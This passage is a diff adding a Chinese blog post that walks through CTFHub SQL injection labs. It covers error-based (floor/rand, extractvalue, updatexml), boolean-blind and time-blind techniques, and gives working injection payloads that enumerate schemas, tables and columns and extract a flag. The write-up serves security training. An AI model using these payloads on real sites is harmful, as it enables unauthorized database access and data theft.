+  &lt;li&gt;查询第二条记录，再次计算&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(rand(0)*2)&lt;/code&gt;，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(rand(0)*2)&lt;/code&gt;不会被计算第二次，直接count(*)加1，第二条记录查询完毕&lt;/li&gt;
+  &lt;li&gt;查询第三条记录，再次计算&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(rand(0)*2)&lt;/code&gt;，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(rand(0)*2)&lt;/code&gt;被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了&lt;/li&gt;
+  &lt;li&gt;整个查询过程&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(rand(0)*2)&lt;/code&gt;被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;如果有一个序列开头是0,1,0或者1,0,1，则无论如何都不会报错了，因为虚表开头两个主键会分别是0和1，后面的就直接&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;count(*)&lt;/code&gt;加1了&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;rand()*2报错原理&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;其实&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand()*2&lt;/code&gt;报错原理与上述的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand(0)*2&lt;/code&gt;原理相同，主要是要保证在开始的查询结果中，不能让虚表中存在0，1键值，不然之后无论多少条记录都不会在报错了，例如随机数：0100011在第一次取数据时插入了1，第二次取数据时插入了0，以后不会再存在主键重复的可能，就不会再报错了，因为表中已经存在0和1这两个数据。
+需要注意的是,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand()*2&lt;/code&gt;当有两条记录的时候就可以报错（但是不绝对），而&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand(0)*2&lt;/code&gt;只有当有三条数据记录数及以上才能报错（但是一定可以报错）。&lt;/p&gt;
+
+&lt;h4 id=&quot;xpath语法错误报错&quot;&gt;xpath语法错误报错&lt;/h4&gt;
+
+&lt;p&gt;从&lt;strong&gt;MySQL 5.1.5&lt;/strong&gt;开始提供两个XML查询和修改的函数，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;extractvalue()&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;updatexml()&lt;/code&gt;。&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;extractvalue()&lt;/code&gt;负责在xml文档中按照xpath语法查询节点内容，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;updatexml()&lt;/code&gt;则负责修改查询到的内容。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1、XML函数之ExtractValue()&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;报错原理：从目标 XML 中返回包含所查询值的字符串。其用法格式如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;extractvalue(XML_document, XPath_string);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;第一个参数：XML_document是 String 格式，为 XML 文档对象的名称。&lt;/li&gt;
+  &lt;li&gt;第二个参数：XPath_string ( Xpath 格式的字符串)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;则&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractValue()&lt;/code&gt;函数构造语句如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;select extractvalue(1,concat(0x26,(查询语句),0x26))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;注：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;extractvalue()&lt;/code&gt;只能查询32位及以内长度的字符，当超出32位时，我们要结合&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mid()&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substr()&lt;/code&gt;或配合&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;right()&lt;/code&gt;等函数使其改变输出来进行注入。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;示例：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721175636.png&quot; alt=&quot;image-20210721175636756&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2、XML函数之updatexml()&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;用法格式：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;updatexml(XML_document, XPath_string, new_value);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;第一个参数：XML_document是String格式，为XML文档对象的名称。&lt;/li&gt;
+  &lt;li&gt;第二个参数：XPath_string (Xpath格式的字符串) 。&lt;/li&gt;
+  &lt;li&gt;第三个参数：new_value，String格式，替换查找到的符合条件的数据 。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;则&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;updatexml()&lt;/code&gt;函数构造语句如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;select updatexml(1,concat(0x26,(查询语句),0x26),1)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;updatexml()&lt;/code&gt;函数同&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractValue()&lt;/code&gt;函数只能查询32位及以内长度的字符，当超出32位时，我们要结合&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mid()&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substr()&lt;/code&gt;或配合&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;right()&lt;/code&gt;等函数使其改变输出来进行注入。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;示例：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721175543.png&quot; alt=&quot;image-20210721175543117&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ctfhub报错注入&quot;&gt;CTFHub(报错注入)&lt;/h3&gt;
+
+&lt;p&gt;1、简单输入几个数字，皆成功执行，又用and检查了一下，执行的SQL语句类似整数型的注入，测试发现命令只要不是语法错误皆会执行成功并返回“查询正确”的字样，无其他信息，此时使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 order by 3&lt;/code&gt;确认了字段数为2。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721163206.png&quot; alt=&quot;image-20210721163206521&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;2、由于题目是利用报错注入进行，故枚举库名，构造执行语句如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select count(*),concat((select database()),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功执行，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721163712.png&quot; alt=&quot;image-20210721163712047&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;此处也可以使用语句：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select count(*),concat((select schema_name from information_schema.schemata limit 3,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后控制limit语句挨个查看相应库名。&lt;/p&gt;
+
+&lt;p&gt;3、枚举表名，将上述语句简单变换一下，即：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select count(*),concat((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;控制limit语句成功爆出2个表名，flag表名如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721165349.png&quot; alt=&quot;image-20210721165349061&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;4、枚举字段名，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select count(*),concat((select column_name from information_schema.columns where table_name=&#39;flag&#39; limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;控制limit语句成功得到相应flag字段名：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721165709.png&quot; alt=&quot;image-20210721165709224&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;5、枚举字段的数值，获得flag，使用语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select count(*),concat((select flag from sqli.flag limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;结果如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721165911.png&quot; alt=&quot;image-20210721165911648&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-布尔注入&quot;&gt;SQL 布尔注入&lt;/h2&gt;
+
+&lt;h3 id=&quot;相关知识-3&quot;&gt;相关知识&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;布尔型&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;布尔（Boolean）型是计算机里的一种数据类型，只有True（真）和False（假）两个值。一般也称为逻辑型。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;盲注&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;在注入时页面无具体数据返回的注入称之为盲注，一般是通过其他表现形式来判断数据的具体内容&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;布尔型盲注&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;页面在执行SQL语句后，只会显示两种结果，这时可通过构造逻辑表达式的SQL语句来判断数据的具体内容。&lt;/p&gt;
+
+&lt;p&gt;使用到的函数功能及介绍如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length()&lt;/code&gt;：返回字符串的长度。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substring()&lt;/code&gt;或&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substr()&lt;/code&gt;：可以截取字符串，可指定开始的位置和截取的长度，结合&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ascii()&lt;/code&gt;使用。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mid()&lt;/code&gt;：同&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substring()&lt;/code&gt;。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ord()&lt;/code&gt;：可以返回单个字符的ASCII码，反之char()函数可将ASCII码转换为对应的字符。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ascii()&lt;/code&gt;：获取字符的ASCII码。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;ctfhub布尔注入&quot;&gt;CTFHub(布尔注入)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;此处自己根据原理编写了脚本工具完成，遂只记录注入关键过程。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;1、猜测数据库中表的数量，构造语句：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and (select count(table_name) from information_schema.tables where table_schema=database())=2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最后的数值为2时，提示&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;success&lt;/code&gt;，说明该库下有两张表：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/22/20210722185241.png&quot; alt=&quot;image-20210722185234459&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;2、此时我们有表的数量，但无库名，后面也比较难进展下去。故使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ord()&lt;/code&gt;与&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substring()&lt;/code&gt;函数配合查库名，构造语句为&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and (select ord(substring(database(),$num,1))) = $ascii_num
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num&lt;/code&gt;配合&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substring()&lt;/code&gt;函数为你需要查询的字符段，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ascii_num&lt;/code&gt;为待查字符的ASCII码，这一过程比较痛苦。因为不知道库名长度及格式情况下要查的挺多，当然此处也可以二分法查找，利用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt;或&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt;号锁定范围，根据返回error与success判断区间。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/22/20210722190738.png&quot; alt=&quot;image-20210722190738553&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;于是，为了减少自己的工程量，此处自己根据原理就编写了一份脚本解决（后续相关查找皆配合自写相关脚本得以解决）。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/22/20210722201130.png&quot; alt=&quot;image-20210722201130258&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;3、根据上述表的数量得知为2，于是我们再来猜表名长度，构造相关语句：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and (select length(table_name) from information_schema.tables where table_schema=database() limit $table_num,1)=$num
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$table_num&lt;/code&gt;值从0开始，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num&lt;/code&gt;为阿拉伯数字，表示表的长度。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/22/20210722191603.png&quot; alt=&quot;image-20210722191603558&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上图得知第一个表名长度为4，经手工测试发现另一个表名长度也为4。&lt;/p&gt;
+
+&lt;p&gt;4、接下来根据表名的长度值确定表名，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit $num1,1),$num2,1))=$ascii_num
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num1&lt;/code&gt;为第一个表名值，从0开始，0表示第一个表，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num2&lt;/code&gt;为待查询表名字符，由1开始递增，1表示查询表名第一个字符，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ascii_num&lt;/code&gt;为ASCII码。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/22/20210722191917.png&quot; alt=&quot;image-20210722191917150&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上图查找后第一个表名为news，第二个表名为flag，此处查找借助脚本完成。&lt;/p&gt;
+
+&lt;p&gt;5、根据上述表名，在查询表中的字段数，构造语句：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and (select count(column_name) from information_schema.columns where table_name=&#39;$table_name&#39;)=$num
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$table_name&lt;/code&gt;为上述查找到的表名，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num&lt;/code&gt;为字段数，即枚举表中有多少字段，此处耗时不长，就两个表需要确认字段。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/22/20210722192749.png&quot; alt=&quot;image-20210722192749247&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由上图得知news表有两个字段，而另一张flag表查找后发现就1个字段.&lt;/p&gt;
+
+&lt;p&gt;6、根据上述得到的相关字段数确定每一列长度，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and length(substr((select column_name from information_schema.columns where table_name=&#39;$table_name&#39; limit $​​num1,1),1))=$num2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$table_name&lt;/code&gt;为待确定的表，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num1&lt;/code&gt;为待确定的第几列字段，从0开始，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num2&lt;/code&gt;为待确定的该列字段的长度值。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/22/20210722193314.png&quot; alt=&quot;image-20210722193314569&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由上图得知flag表第一个字段长度为4，另一张news表经测试发现第一个字段长度为2，第二个字段长度为4。&lt;/p&gt;
+
+&lt;p&gt;7、根据字段长度确定字段名，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and ascii(substr((select column_name from information_schema.columns where table_name=&#39;$table_name&#39; limit $num1,1),$num2,1))=$ascii_num
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$table_name&lt;/code&gt;为待确定字段值的表名，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num1&lt;/code&gt;为待确定的第几列字段，从0开始，0表示第一个字段，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num2&lt;/code&gt;表示该列字段的第几个数值，从1递增，1表示第一个，此处排查很耗费时间，可以借助二分法查找。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/22/20210722193930.png&quot; alt=&quot;image-20210722193930032&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由上图得知flag表的第一个字段的第一个值ASCII码值为102，即f，查完后该字段值为flag；另一个表名news的第一个字段名为id，第二个字段名为data。此处为查找方便故使用脚本解决：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/22/20210722201317.png&quot; alt=&quot;image-20210722201317275&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;8、根据数据库名、表名、字段名确定字段的值，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and ascii(substr((select $column_name from $table_name limit $num1,1),$num2,1))=$ascii_num
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$column_name&lt;/code&gt;为字段名，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$table_name&lt;/code&gt;为表名，也可以是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;库名.表名&lt;/code&gt;的形式，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num1&lt;/code&gt;为第几行的值，从0开始，0表示该字段中的第一行值；&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num2&lt;/code&gt;表示该行字段的第几个值，从1递增，1表示该字段的第一个值，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ascii_num&lt;/code&gt;表示ASCII码。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/22/20210722195820.png&quot; alt=&quot;image-20210722195820424&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上图可知，news表中id字段第一行第一个值的ASCII码值为49，即1。由于此处news表不是我们的目标数据表，遂直接跑flag表，直接上脚本跑得flag表，结果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/22/20210722201540.png&quot; alt=&quot;image-20210722201540813&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可知flag字段值为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctfhub{1f7aaf763a54c3ec1a39a01f}&lt;/code&gt;。&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-时间盲注&quot;&gt;SQL 时间盲注&lt;/h2&gt;
+
+&lt;h3 id=&quot;相关知识-4&quot;&gt;相关知识&lt;/h3&gt;
+
+&lt;p&gt;时间盲注指通过页面执行的时间来判断数据内容的注入方式，通常用于数据（包含逻辑型）不能返回到页面中的场景，无法利用页面回显判断数据内容，只能通过执行的时间来获取数据&lt;/p&gt;
+
+&lt;p&gt;时间盲注一般步骤如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;构造一个payload，payload内的延迟函数设置参数为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;t&lt;/code&gt;，如果满足某种条件，则延时 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;t&lt;/code&gt; 秒之后返回；否则直接返回。&lt;/li&gt;
+  &lt;li&gt;发送payload，观察执行时间，从而推断出条件是否满足。&lt;/li&gt;
+  &lt;li&gt;重复上述两步，直到推出所有信息。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;使用到的函数功能及介绍如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sleep(t)&lt;/code&gt;：延时&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;t&lt;/code&gt;秒钟。这个函数返回值是0。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length(str)&lt;/code&gt; ：返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt;的长度。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substring()&lt;/code&gt;或&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substr()&lt;/code&gt;：可以截取字符串，可指定开始的位置和截取的长度，结合&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ascii()&lt;/code&gt;使用。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mid()&lt;/code&gt;：同&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substring()&lt;/code&gt;。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;left(str,len)&lt;/code&gt; ：字符串左截取函数，返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt;的左&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;len&lt;/code&gt;个字符。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;right(str,len)&lt;/code&gt; ：字符串右截取函数，返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sre&lt;/code&gt;的右&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;len&lt;/code&gt;个字符。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ord()&lt;/code&gt;：可以返回单个字符的ASCII码，反之&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char()&lt;/code&gt;函数可将ASCII码转换为对应的字符。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ascii(str)&lt;/code&gt;：获取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt;字符的ASCII码，如果&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt;是空串，则返回0；如果&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt;是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;，则返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if(expr1, expr2, expr3)&lt;/code&gt; ：逻辑判断函数。如果&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;expr1&lt;/code&gt;为真，则执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;expr2&lt;/code&gt;，否则执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;expr3&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;ctfhub时间盲注&quot;&gt;CTFHub(时间盲注)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;此处因时间关系未编写相对完善的脚本了，基于ctfhub技能树的flag字段值皆是在sqli.flag表中，故此处只说明注入流程及实现。&lt;/p&gt;
+
+  &lt;p&gt;注：SQL语句构造千千万，下方只是个人实践并根据执行逻辑总结出来的语句。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;1、根据上述的相关知识，开始尝试注入，先编写语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and if(1=1,sleep(3),0) --+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;浏览器窗口明显的延迟，故语句注入成功，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723120123.png&quot; alt=&quot;image-20210723120116025&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;后又根据单引号&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&#39;&lt;/code&gt;与右括号的闭合尝试执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;)&lt;/code&gt;，发现均没有执行到if里面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sleep()&lt;/code&gt;函数，故可以猜测SQL语句是整型注入的语句。&lt;/p&gt;
+
+&lt;p&gt;2、猜一下数据库名的长度值，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and if((select count(schema_name) from information_schema.schemata)=$num,sleep(3),1)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num&lt;/code&gt;为数据库名的长度值，当值为4的时候，延迟函数执行了，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723122851.png&quot; alt=&quot;image-20210723122851015&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由此可知数据库名长度为4。&lt;/p&gt;
+
+&lt;p&gt;3、知道数据库名长度为4后，开始枚举一下当前的数据库名，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and if(ascii(substring(database(),$num,1))=$ascii_num,sleep(3),1) --+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num&lt;/code&gt;为该库的第几个字符值，从1开始递增，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ascii_num&lt;/code&gt;为对应的ASCII码，此处也可以使用二分法查找，执行后观察控制台，延迟了3秒，故语句执行成功，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723123345.png&quot; alt=&quot;image-20210723123345302&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上述图可知，ASCII码为115，即数据库名第一个值为s时执行了延迟函数，后面同理推断出数据库名为sqli。&lt;/p&gt;
+
+&lt;p&gt;4、根据库名开始枚举表的数量，构造语句为：&lt;/p&gt;
+
